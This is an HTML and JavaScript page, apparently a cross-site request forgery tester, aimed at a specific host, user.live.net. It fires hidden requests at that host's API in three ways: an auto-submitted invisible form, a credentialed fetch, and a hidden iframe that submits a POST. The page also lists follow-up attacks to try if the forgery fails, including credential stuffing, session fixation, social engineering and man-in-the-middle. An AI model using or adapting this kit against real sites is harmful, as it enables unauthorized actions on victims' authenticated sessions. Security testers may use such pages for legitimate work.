<!DOCTYPE html>
<html>
<head>
    <title>Basic Auth CSRF Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .test-section {
            margin: 20px 0;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            background-color: #dc3545;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            background-color: #c82333;
        }
        .status {
            margin: 10px 0;
            padding: 10px;
            border-radius: 5px;
        }
        .success { background-color: #d4edda; border: 1px solid #c3e6cb; }
        .error { background-color: #f8d7da; border: 1px solid #f5c6cb; }
        .warning { background-color: #fff3cd; border: 1px solid #ffeaa7; }
        pre {
            background: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîê Basic Auth CSRF Testing</h1>
        <p><strong>Target:</strong> https://user.live.net</p>
        
        <div class="test-section">
            <h2>Test 1: Silent Form Submission (Classic CSRF)</h2>
            <p>Tests if browser automatically includes Basic Auth headers</p>
            <form id="silentForm" method="POST" action="https://user.live.net/api/endpoint" style="display:none;">
                <input type="hidden" name="action" value="test_csrf">
                <input type="hidden" name="timestamp" value="">
            </form>
            <button onclick="testSilentCSRF()">üöÄ Test Silent CSRF</button>
            <div id="silentResult"></div>
        </div>

        <div class="test-section">
            <h2>Test 2: Visible Form (User Interaction)</h2>
            <p>Shows the form - if browser prompts for auth, it's vulnerable</p>
            <form id="visibleForm" method="POST" action="https://user.live.net/api/endpoint">
                <input type="hidden" name="action" value="test_csrf_visible">
                <input type="hidden" name="timestamp" value="">
                <button type="submit">Submit Test Request</button>
            </form>
        </div>

        <div class="test-section">
            <h2>Test 3: Fetch with Credentials</h2>
            <p>Tests if JavaScript can include existing browser credentials</p>
            <button onclick="testFetchWithCredentials()">üîç Test Fetch</button>
            <div id="fetchResult"></div>
        </div>

        <div class="test-section">
            <h2>Test 4: Iframe Hidden Request</h2>
            <p>Tests CSRF via hidden iframe (bypasses some protections)</p>
            <button onclick="testIframeCSRF()">üì± Test Iframe CSRF</button>
            <div id="iframeResult"></div>
            <iframe id="hiddenFrame" style="display:none;"></iframe>
        </div>

        <div class="test-section">
            <h2>üîß Workarounds If CSRF Fails</h2>
            <div class="warning">
                <h3>Alternative Attack Vectors:</h3>
                <ul>
                    <li><strong>Credential Stuffing:</strong> If you know common passwords</li>
                    <li><strong>Session Fixation:</strong> Force user to authenticate with known credentials</li>
                    <li><strong>Social Engineering:</strong> Trick user into entering credentials</li>
                    <li><strong>Man-in-the-Middle:</strong> If app doesn't validate certificates</li>
                    <li><strong>Deep Link Injection:</strong> Malicious URLs that include credentials</li>
                </ul>
            </div>
        </div>

        <div class="test-section">
            <h2>üìã Results Analysis</h2>
            <div id="analysisResult">
                <p>Run the tests above to see analysis...</p>
            </div>
        </div>
    </div>

    <script>
        let testResults = {};

        function updateAnalysis() {
            const analysisDiv = document.getElementById('analysisResult');
            let analysis = '<h3>Test Results Summary:</h3>';
            
            if (Object.keys(testResults).length === 0) {
                analysis += '<p>No tests run yet.</p>';
            } else {
                analysis += '<ul>';
                Object.entries(testResults).forEach(([test, result]) => {
                    analysis += `<li><strong>${test}:</strong> ${result.status} - ${result.message}</li>`;
                });
                analysis += '</ul>';

                // Provide recommendations
                const hasSuccess = Object.values(testResults).some(r => r.status === 'SUCCESS');
                const hasAuthPrompt = Object.values(testResults).some(r => r.message.includes('auth prompt'));
                
                if (hasSuccess) {
                    analysis += '<div class="success"><strong>üéØ CSRF is possible!</strong> Browser is automatically including auth headers.</div>';
                } else if (hasAuthPrompt) {
                    analysis += '<div class="warning"><strong>‚ö†Ô∏è Partial vulnerability:</strong> CSRF requires user interaction (auth prompt).</div>';
                } else {
                    analysis += '<div class="error"><strong>üõ°Ô∏è CSRF blocked:</strong> Basic Auth is protecting against CSRF. Try alternative attacks.</div>';
                }
            }
            
            analysisDiv.innerHTML = analysis;
        }

        function testSilentCSRF() {
            const resultDiv = document.getElementById('silentResult');
            const form = document.getElementById('silentForm');
            
            // Set timestamp
            form.elements['timestamp'].value = new Date().toISOString();
            
            resultDiv.innerHTML = '<div class="warning">Submitting silent form... Check network tab for results.</div>';
            
            // Submit form silently
            form.submit();
            
            // Since we can't easily detect the response due to CORS, 
            // we'll rely on user observation
            setTimeout(() => {
                resultDiv.innerHTML = `
                    <div class="status">
                        <strong>Form submitted!</strong><br>
                        üîç Check your browser's Network tab:<br>
                        ‚Ä¢ If you see the request with 200 response ‚Üí CSRF works!<br>
                        ‚Ä¢ If you see 401/403 ‚Üí CSRF blocked by auth<br>
                        ‚Ä¢ If browser showed auth popup ‚Üí Partially vulnerable
                    </div>
                `;
                
                testResults['Silent Form'] = {
                    status: 'PENDING',
                    message: 'Check network tab for actual result'
                };
                updateAnalysis();
            }, 1000);
        }

        async function testFetchWithCredentials() {
            const resultDiv = document.getElementById('fetchResult');
            
            try {
                resultDiv.innerHTML = '<div class="warning">Testing fetch with credentials...</div>';
                
                const response = await fetch('https://user.live.net/api/endpoint', {
                    method: 'POST',
                    credentials: 'include', // Include cookies and basic auth
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        action: 'test_fetch',
                        timestamp: new Date().toISOString()
                    })
                });
                
                let message = `Response status: ${response.status}`;
                let status = 'SUCCESS';
                
                if (response.status === 401 || response.status === 403) {
                    message += ' - Authentication required (CSRF likely blocked)';
                    status = 'BLOCKED';
                } else if (response.status >= 200 && response.status < 300) {
                    message += ' - Request successful (CSRF possible!)';
                    status = 'SUCCESS';
                } else {
                    message += ' - Unexpected response';
                    status = 'UNKNOWN';
                }
                
                resultDiv.innerHTML = `<div class="status ${status === 'SUCCESS' ? 'success' : 'error'}">${message}</div>`;
                
                testResults['Fetch with Credentials'] = { status, message };
                
            } catch (error) {
                let message = `Error: ${error.message}`;
                let status = 'ERROR';
                
                if (error.message.includes('CORS')) {
                    message += ' - CORS error (expected for cross-origin)';
                } else if (error.message.includes('network')) {
                    message += ' - Network error (auth might have failed)';
                }
                
                resultDiv.innerHTML = `<div class="status error">${message}</div>`;
                testResults['Fetch with Credentials'] = { status, message };
            }
            
            updateAnalysis();
        }

        function testIframeCSRF() {
            const resultDiv = document.getElementById('iframeResult');
            const iframe = document.getElementById('hiddenFrame');
            
            resultDiv.innerHTML = '<div class="warning">Testing iframe CSRF...</div>';
            
            // Create a form in the iframe
            const formHTML = `
                <html>
                <body>
                <form id="csrfForm" method="POST" action="https://user.live.net/api/endpoint">
                    <input type="hidden" name="action" value="iframe_test">
                    <input type="hidden" name="timestamp" value="${new Date().toISOString()}">
                </form>
                <script>
                    document.getElementById('csrfForm').submit();
                <\/script>
                </body>
                </html>
            `;
            
            // Set iframe content
            iframe.onload = () => {
                setTimeout(() => {
                    resultDiv.innerHTML = `
                        <div class="status">
                            <strong>Iframe test executed!</strong><br>
                            The iframe attempted to submit a POST request.<br>
                            Check the Network tab to see if it succeeded.
                        </div>
                    `;
                    
                    testResults['Iframe CSRF'] = {
                        status: 'PENDING',
                        message: 'Check network tab - iframe submitted form'
                    };
                    updateAnalysis();
                }, 2000);
            };
            
            iframe.src = 'data:text/html;base64,' + btoa(formHTML);
        }

        // Auto-update timestamps
        setInterval(() => {
            document.querySelectorAll('input[name="timestamp"]').forEach(input => {
                if (input.value === '') {
                    input.value = new Date().toISOString();
                }
            });
        }, 1000);

        // Instructions on page load
        window.onload = () => {
            console.log('üîê Basic Auth CSRF Tester Loaded');
            console.log('üìã Instructions:');
            console.log('1. Run each test');
            console.log('2. Watch the Network tab in DevTools');
            console.log('3. Look for HTTP status codes (200=success, 401/403=auth failed)');
            console.log('4. Check if browser prompts for credentials');
        };
    </script>
</body>
</html>
